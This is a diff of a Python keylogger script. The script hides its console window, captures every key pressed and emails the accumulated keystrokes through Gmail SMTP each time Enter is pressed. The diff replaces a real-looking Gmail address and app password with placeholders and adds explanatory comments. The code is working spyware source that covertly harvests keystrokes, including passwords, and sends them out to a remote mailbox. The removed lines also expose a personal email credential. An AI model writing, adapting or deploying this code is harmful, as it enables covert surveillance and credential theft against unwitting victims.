@@ -4,18 +4,19 @@ import ctypes
 import smtplib
 
 # === HIDE CONSOLE WINDOW ===
+#this will hide it from the Task Manager
 if sys.platform == "win32":
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 # === EMAIL SETTINGS ===
-EMAIL_ADDRESS = "casianpantilimon98@gmail.com"
-EMAIL_PASSWORD = "jdux uinh jkfo lstp"  # Use an app password for Gmail
-TO_EMAIL = "casianpantilimon98@gmail.com"
+EMAIL_ADDRESS = "YourEmail@gmail.com"
+EMAIL_PASSWORD = "here you will have use the password provided by your app (Gmail, in my case) " 
+TO_EMAIL = "ReceiverEmail@gmail.com"
 
 keys = []  # List to store keystrokes
 
 def send_email(log_data):
-    """Send captured keystrokes via email."""
+    """ Send captured keystrokes via email."""
     subject = "Keylogger Logs"
     body = f"Captured Keystrokes:\n\n{log_data}"
     email_text = f"Subject: {subject}\n\n{body}"
@@ -25,7 +26,7 @@ def send_email(log_data):
             server.starttls()
             server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
             server.sendmail(EMAIL_ADDRESS, TO_EMAIL, email_text)
-        print("Logs sent via email successfully!")  # This is the mesage that we are going to receive to make sure
+        print("Logs sent via email successfully!")  # This is the message that we are going to receive to make sure
         #that our mail was sent
     except Exception as e:
         print(f"Error sending email: {e}") #this is the message that we are going to receive in case of an error
@@ -39,10 +40,11 @@ if __name__ == "__main__":
         if event.event_type == keyboard.KEY_DOWN:
             if key == "esc":  # Stop logging when 'esc' is pressed
                 break
+                #a funny way to break the program would be: if key == "esc" and "ctrl" and "enter" and "space"
             print(key)  # Debugging (remove in final version)
             keys.append(key)
 
-            # === SEND EMAIL WHEN "ENTER" IS PRESSED ===
+            # === SEND EMAIL EVERY TIME "ENTER" IS PRESSED ===
             if key == "enter":
                 log_data = " ".join(filter(None, keys))  # Convert list to string
                 send_email(log_data)  # Send logs via email
